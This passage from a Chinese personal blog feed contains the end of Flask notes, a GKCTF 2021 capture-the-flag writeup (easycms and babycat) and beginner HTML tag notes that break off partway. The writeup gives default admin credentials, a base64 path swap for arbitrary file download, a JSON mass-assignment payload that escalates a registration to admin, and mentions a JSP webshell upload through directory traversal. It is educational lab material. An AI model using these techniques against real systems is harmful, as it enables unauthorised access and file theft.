<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://zhuanlan.zhihu.com/p/26724125">https://zhuanlan.zhihu.com/p/26724125</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584#0">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584#0</a></p>
<p><a href="https://www.jianshu.com/p/b6f1aea3a2eb">https://www.jianshu.com/p/b6f1aea3a2eb</a></p>
<p><a href="https://blog.csdn.net/zss192/article/details/104200493">https://blog.csdn.net/zss192/article/details/104200493</a></p>
<hr>
<p><strong>补充下：</strong><br>内置函数：get_flashed_messages(), url_for()</p>
<p>url_for()<br>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</p>
<p>get_flashed_messages()<br>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF writeup</title>
    <url>/2021/06/28/GKCTF-writeup/</url>
    <content><![CDATA[<p>y11由于比赛和期末考试周冲突到了就没去打，现在考试结束了特来复现<a id="more"></a></p>
<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>admin.php存在后台登入</p>
<p>账号admin</p>
<p>密码12345</p>
<p>登入后在主题出存在主题导出，查看导出链接</p>
<blockquote>
<p><a href="http://b5d12352-545d-4461-a8e3-47732d9fc7ce.node4.buuoj.cn/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvaXkyOC56aXA=">http://b5d12352-545d-4461-a8e3-47732d9fc7ce.node4.buuoj.cn/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvaXkyOC56aXA=</a></p>
</blockquote>
<p>后面那串解码发现为</p>
<img src="http://img.npfs06.top/20210716091827.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">

<p>直接改为/flag ，base64加密后下载即为flag文件</p>
<h2 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2><p>sign up时alert了</p>
<img src="http://img.npfs06.top/20210717104628.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">

<p>通过查看源代码，知道注册信息的组成，可以抓包绕过alert,进行注册</p>
<p>data={“username”:”admin”,”password”:”123”}</p>
<img src="http://img.npfs06.top/20210717104329.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">

<p>注册后，发现role为guest,没有upload权限，提示需要role为admin</p>
<img src="http://img.npfs06.top/20210717104531.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">



<p>不过在Download Test处发现存在任意文件下载  ,可以读web.xml -&gt; class ,没发现利用点javaweb 目录</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/WEB-INF/</span>web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"><span class="regexp">/WEB-INF/</span>classes/：含了站点所有用的 <span class="keyword">class</span> 文件，包括 servlet <span class="keyword">class</span> 和非servlet <span class="keyword">class</span>，他们不能包含在 .jar文件中</span><br><span class="line"><span class="regexp">/WEB-INF/</span>lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line"><span class="regexp">/WEB-INF/</span>src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"><span class="regexp">/WEB-INF/</span>database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
<p>在注册页面的源代码钟，role是控制权限的，而且在代码处可能存在拼接，这里尝试拼接json进行注入。</p>
<p>data={“username”:”123″,”password”:”123″,”\u0072\u006F\u006C\u0065″:”admin”,”123″:{“role”:”guest”}}                     </p>
<p><img src="http://img.npfs06.top/20210717114805.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>注册成功，变成admin，这里可以进入upload进行上传文件</p>
<p>通过之前的报错，知道网站是tomcat，可以传jsp🐎</p>
<p>默认目录无法上传，前面图片存在的位置是../../static/，所以尝试来个目录穿越</p>
<img src="http://img.npfs06.top/20210717134613.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">



<img src="http://img.npfs06.top/20210717134551.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:67%;">]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2020/04/05/HTML/</url>
    <content><![CDATA[<p>之前学html时做的笔记<a id="more"></a></p>
<h1 id="实现0秒跳转"><a href="#实现0秒跳转" class="headerlink" title="实现0秒跳转"></a>实现0秒跳转</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; http://fishc.taobao.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="“自适应”-PC和手机"><a href="#“自适应”-PC和手机" class="headerlink" title="“自适应” PC和手机"></a>“自适应” PC和手机</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="CSS简单设置颜色"><a href="#CSS简单设置颜色" class="headerlink" title="CSS简单设置颜色"></a>CSS简单设置颜色</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span>                 </span><br><span class="line"><span class="css">     <span class="selector-tag">h1</span> &#123;<span class="attribute">color</span>: red&#125;    </span></span><br><span class="line"><span class="css">     <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>: blue&#125;    </span></span><br><span class="line"><span class="css">     <span class="selector-tag">a</span> &#123;                </span></span><br><span class="line"><span class="css">     	<span class="attribute">color</span>: yellow;     </span></span><br><span class="line"><span class="css">     	<span class="attribute">background</span>: black; </span></span><br><span class="line">    	&#125;                  </span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span>           </span><br></pre></td></tr></table></figure>




<hr>
<h1 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">body</span> &#123;                                 </span></span><br><span class="line"><span class="css">    	<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;../img/bc.png&quot;</span>) </span></span><br><span class="line">     &#125;                                      </span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="视图界面大小"><a href="#视图界面大小" class="headerlink" title="视图界面大小"></a>视图界面大小</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">media</span>=<span class="string">&quot;screen and (min-width:512px) and (max-width:1024px)&quot;</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;../img/1.png&quot;</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="CSS外链"><a href="#CSS外链" class="headerlink" title="CSS外链"></a>CSS外链</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;styles.css&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;print&quot;</span> <span class="attr">href</span>=<span class="string">&quot;print.css&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;screen and (min-width:512px) and (max-width:1024px)&quot;</span> <span class="attr">href</span>=<span class="string">&quot;screen512to1024.css&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../img/favicon.ico&quot;</span>&gt;</span> |</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="基础路径"><a href="#基础路径" class="headerlink" title="基础路径"></a>基础路径</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://demo.npfs.com/html5/lesson4/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="js外链"><a href="#js外链" class="headerlink" title="js外链"></a>js外链</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;hi.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="noscript"><a href="#noscript" class="headerlink" title="noscript"></a>noscript</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        你的浏览器不支持javascript 哦！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="lt-span-gt"><a href="#lt-span-gt" class="headerlink" title="&lt; span &gt;"></a>&lt; span &gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>:red;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>黑夜给了我黑色的<span class="tag">&lt;<span class="name">span</span>&gt;</span>眼睛<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-pre-gt"><a href="#lt-pre-gt" class="headerlink" title="&lt; pre &gt;"></a>&lt; pre &gt;</h1><p>原样输出</p>
<hr>
<h1 id="lt-code-gt-标签是一个短语标签，用来定义计算机代码文本。"><a href="#lt-code-gt-标签是一个短语标签，用来定义计算机代码文本。" class="headerlink" title="&lt; code &gt; 标签是一个短语标签，用来定义计算机代码文本。"></a>&lt; code &gt; 标签是一个短语标签，用来定义计算机代码文本。</h1><p>&lt;code&gt; 标签是一个短语标签，用来定义计算机代码文本。</p>
<hr>
<h1 id="lt-q-gt"><a href="#lt-q-gt" class="headerlink" title="&lt; q &gt;"></a>&lt; q &gt;</h1><p>&lt;q&gt;标签定义短的引用。</p>
<p>浏览器经常在引用的内容周围添加引号。</p>
<hr>
<h1 id="lt-blockquote-gt"><a href="#lt-blockquote-gt" class="headerlink" title="&lt; blockquote&gt;"></a>&lt; blockquote&gt;</h1><p>&lt; blockquote&gt;标签定义摘自另一个源的块引用。</p>
<p>浏览器通常会对 &lt; blockquote&gt; 元素里所以内容进行缩进。</p>
<hr>
<h1 id="lt-abbr-gt"><a href="#lt-abbr-gt" class="headerlink" title="&lt; abbr &gt;"></a>&lt; abbr &gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;鱼C工作室&quot;</span>&gt;</span>FishC.com<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> was founded in 2010.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示效果：FishC.com下有虚线，鼠标停留会提示：鱼C工作室</p>
<hr>
<h1 id="lt-dfn-gt"><a href="#lt-dfn-gt" class="headerlink" title="&lt; dfn&gt;"></a>&lt; dfn&gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">dfn</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">dfn</span>&gt;</span>是一门用于创建网页的标准标记语言。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示效果：斜字体</p>
<hr>
<h1 id="lt-address-gt"><a href="#lt-address-gt" class="headerlink" title="&lt; address&gt;"></a>&lt; address&gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">邮箱：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:fishc_service@126.com&quot;</span>&gt;</span>fishc_service@126.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">旺旺：dingdingjiayu<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">微信：fishc_studio（公众号）<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示效果：整段斜字体</p>
<hr>
<h1 id="lt-ruby-gt"><a href="#lt-ruby-gt" class="headerlink" title="&lt; ruby&gt;"></a>&lt; ruby&gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ruby</span>&gt;</span>魑<span class="tag">&lt;<span class="name">rp</span>&gt;</span>（<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;<span class="name">rt</span>&gt;</span>chī<span class="tag">&lt;/<span class="name">rt</span>&gt;</span><span class="tag">&lt;<span class="name">rp</span>&gt;</span>）<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;/<span class="name">ruby</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ruby</span>&gt;</span>魅<span class="tag">&lt;<span class="name">rp</span>&gt;</span>（<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;<span class="name">rt</span>&gt;</span>mèi<span class="tag">&lt;/<span class="name">rt</span>&gt;</span><span class="tag">&lt;<span class="name">rp</span>&gt;</span>）<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;/<span class="name">ruby</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ruby</span>&gt;</span>魍<span class="tag">&lt;<span class="name">rp</span>&gt;</span>（<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;<span class="name">rt</span>&gt;</span>wǎng<span class="tag">&lt;/<span class="name">rt</span>&gt;</span><span class="tag">&lt;<span class="name">rp</span>&gt;</span>）<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;/<span class="name">ruby</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ruby</span>&gt;</span>魉<span class="tag">&lt;<span class="name">rp</span>&gt;</span>（<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;<span class="name">rt</span>&gt;</span>liǎng<span class="tag">&lt;/<span class="name">rt</span>&gt;</span><span class="tag">&lt;<span class="name">rp</span>&gt;</span>）<span class="tag">&lt;/<span class="name">rp</span>&gt;</span><span class="tag">&lt;/<span class="name">ruby</span>&gt;</span></span><br><span class="line">&lt;/body</span><br></pre></td></tr></table></figure>
<p>显示效果：给字上方加注音</p>
<blockquote>
<p>ruby 元素由一个或多个字符（需要一个解释/发音）和一个提供该信息的 rt 元素组成，还包括可选的 rp 元素，定义当浏览器不支持 “ruby” 元素时显示的内容。</p>
</blockquote>
<hr>
<h1 id="lt-strong-gt-lt-b-gt"><a href="#lt-strong-gt-lt-b-gt" class="headerlink" title="&lt; strong&gt; / &lt; b&gt;"></a>&lt; strong&gt; / &lt; b&gt;</h1><p>都能使文本变粗</p>
<hr>
<h1 id="lt-em-gt-lt-i-gt"><a href="#lt-em-gt-lt-i-gt" class="headerlink" title="&lt; em&gt; / &lt; i&gt;"></a>&lt; em&gt; / &lt; i&gt;</h1><p>&lt;em&gt;标签告诉浏览器把其中的文本表示为强调的内容。</p>
<p>显示效果：用斜体来显示。</p>
<p>&lt;i&gt;元素也可以让内容<em>倾斜</em>，只不过它没有附带任何表示强调的语义</p>
<hr>
<h1 id="使用css代替b和i元素"><a href="#使用css代替b和i元素" class="headerlink" title="使用css代替b和i元素"></a>使用css代替b和i元素</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.bold</span> &#123;<span class="attribute">font-weight</span>: bolder;&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.italic</span> &#123;<span class="attribute">font-style</span>: italic;&#125;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>这里的内容都加粗会比较好看！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;italic&quot;</span>&gt;</span>这里的内容还是倾斜的好……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-del-gt-lt-s-gt"><a href="#lt-del-gt-lt-s-gt" class="headerlink" title="&lt; del&gt;  / &lt; s&gt;"></a>&lt; del&gt;  / &lt; s&gt;</h1><p>显示效果：将文章划掉</p>
<hr>
<h1 id="lt-ins-gt-lt-u-gt"><a href="#lt-ins-gt-lt-u-gt" class="headerlink" title="&lt; ins&gt; / &lt; u&gt;"></a>&lt; ins&gt; / &lt; u&gt;</h1><p>显示效果：将文章加下划线（实线）</p>
<hr>
<h1 id="lt-mark-gt"><a href="#lt-mark-gt" class="headerlink" title="&lt; mark&gt;"></a>&lt; mark&gt;</h1><p>突出显示部分文本(默认为黄色背景)</p>
<hr>
<h1 id="lt-sup-gt-lt-sub-gt"><a href="#lt-sup-gt-lt-sub-gt" class="headerlink" title="&lt; sup&gt;    &lt; sub&gt;"></a>&lt; sup&gt;    &lt; sub&gt;</h1><p>&lt;sup&gt; 为上标</p>
<p>&lt;sub&gt; 为下标</p>
<hr>
<h1 id="lt-small-gt"><a href="#lt-small-gt" class="headerlink" title="&lt; small&gt;"></a>&lt; small&gt;</h1><p>显示效果：字体变小</p>
<hr>
<h3 id="list-style-type"><a href="#list-style-type" class="headerlink" title="list-style-type"></a>list-style-type</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">ul</span><span class="selector-class">.a</span> &#123;<span class="attribute">list-style-type</span>: square;&#125;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">ul</span><span class="selector-class">.b</span> &#123;<span class="attribute">list-style-type</span>: disc;&#125;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">ul</span><span class="selector-class">.c</span> &#123;<span class="attribute">list-style-type</span>: circle;&#125;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">ul</span><span class="selector-class">.d</span> &#123;<span class="attribute">list-style-type</span>: none;&#125;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span>		</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Tea<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Me<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Tea<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Me<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;c&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Tea<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Me<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;d&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Tea<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Me<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="自定义列表标签"><a href="#自定义列表标签" class="headerlink" title="自定义列表标签"></a>自定义列表标签</h1><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line">&lt;<span class="string">head</span>&gt;</span><br><span class="line">	&lt;<span class="string">style</span>&gt;</span><br><span class="line">        <span class="string">ul</span> &#123;</span><br><span class="line">            <span class="built_in">list-style-image:</span> <span class="string">url</span>(<span class="string">&quot;img/turtle.png&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/<span class="string">style</span>&gt;</span><br><span class="line">&lt;/<span class="string">head</span>&gt;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-dl-gt"><a href="#lt-dl-gt" class="headerlink" title="&lt; dl&gt;"></a>&lt; dl&gt;</h1><p>&lt; dl&gt; 标签定义一个描述列表。</p>
<p>&lt; dl&gt; 标签与  &lt; dt&gt;（定义项目/名字）和 &lt; dd&gt;（描述每一个项目/名字）一起使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>fishc.com.cn<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span>一个神奇的论坛。<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-table-gt"><a href="#lt-table-gt" class="headerlink" title="&lt; table&gt;"></a>&lt; table&gt;</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>小甲鱼<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>18<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>不二如是<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 